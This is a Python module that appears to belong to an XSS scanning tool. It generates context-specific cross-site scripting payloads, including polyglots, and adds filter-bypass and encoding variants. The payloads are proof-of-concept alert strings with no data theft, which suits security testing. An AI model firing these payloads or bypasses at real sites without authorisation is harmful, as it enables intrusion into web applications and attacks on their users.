"""
Context-aware XSS payload generator
"""
import random
import string

class PayloadGenerator:
    """Generate XSS payloads based on context"""
    
    def __init__(self, config):
        self.config = config
        self.custom_payloads = self._load_custom_payloads()
    
    def _load_custom_payloads(self):
        """Load custom payloads from file if provided"""
        if self.config.custom_payloads:
            try:
                with open(self.config.custom_payloads, 'r') as f:
                    return [line.strip() for line in f if line.strip()]
            except Exception as e:
                print(f"Warning: Could not load custom payloads: {e}")
        return []
    
    def generate_marker(self):
        """Generate unique marker for detection"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    
    def get_payloads(self, context='html'):
        """Get payloads based on context"""
        if self.custom_payloads:
            return self.custom_payloads
        
        payloads = {
            'html': self._get_html_payloads(),
            'attribute': self._get_attribute_payloads(),
            'javascript': self._get_javascript_payloads(),
            'url': self._get_url_payloads(),
            'generic': self._get_generic_payloads()
        }
        
        return payloads.get(context, payloads['generic'])
    
    def _get_html_payloads(self):
        """HTML context payloads"""
        return [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<img src=x onerror="alert(1)">',
            '<svg/onload=alert(1)>',
            '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
        ]
    
    def _get_attribute_payloads(self):
        """Attribute context payloads"""
        return [
            '" onload="alert(1)',
            "' onload='alert(1)",
            '" onfocus="alert(1)" autofocus="',
            "' onfocus='alert(1)' autofocus='",
            '" onclick="alert(1)',
            "' onclick='alert(1)",
            '" onmouseover="alert(1)',
            "' onmouseover='alert(1)",
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '" onerror="alert(1)',
            "' onerror='alert(1)",
        ]
    
    def _get_javascript_payloads(self):
        """JavaScript context payloads"""
        return [
            "'; alert(1); //",
            '"; alert(1); //',
            "'; alert(1); var x='",
            '"; alert(1); var x="',
            '-alert(1)-',
            "';alert(1);//",
            '";alert(1);//',
            "'-alert(1)-'",
            '"-alert(1)-"',
            "\\'; alert(1); //",
            '\\\"; alert(1); //',
        ]
    
    def _get_url_payloads(self):
        """URL context payloads"""
        return [
            'javascript:alert(1)',
            'javascript:alert(1)//',
            'javascript://comment%0aalert(1)',
            'javascript:alert(String.fromCharCode(88,83,83))',
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        ]
    
    def _get_generic_payloads(self):
        """Generic payloads that work in multiple contexts"""
        return [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
            '"><img src=x onerror=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            # Polyglot payloads
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
            '">\'><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'">',
            # Filter bypass
            '<script>alert(1)</script>',
            '<ScRiPt>alert(1)</ScRiPt>',
            '<script>alert(1);</script>',
            '<script>alert(1) </script>',
            '<script >alert(1)</script>',
            '<<script>alert(1);//<</script>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            # Event handlers
            '<img src=x onerror=alert(1)>',
            '<img src=x onerror="alert(1)">',
            '<img src=x onerror=\'alert(1)\'>',
            '<img src=x:alert(1) onerror=alert(1)>',
            '<img src=x onerror=alert`1`>',
        ]
    
    def encode_payload(self, payload, encoding='url'):
        """Encode payload for bypass attempts"""
        if encoding == 'url':
            from urllib.parse import quote
            return quote(payload)
        elif encoding == 'html':
            import html
            return html.escape(payload)
        elif encoding == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        return payload
    
    def get_bypass_payloads(self, original_payload):
        """Generate bypass variations of a payload"""
        bypasses = []
        
        # Case variation
        bypasses.append(original_payload.swapcase())
        
        # Add null bytes
        bypasses.append(original_payload.replace('<', '<\x00'))
        
        # Add comments
        bypasses.append(original_payload.replace('<', '<!--><'))
        
        # Double encoding
        from urllib.parse import quote
        bypasses.append(quote(quote(original_payload)))
        
        # Mixed case
        if 'script' in original_payload.lower():
            bypasses.append(original_payload.replace('script', 'ScRiPt'))
            bypasses.append(original_payload.replace('script', 'SCRIPT'))
        
        return bypasses
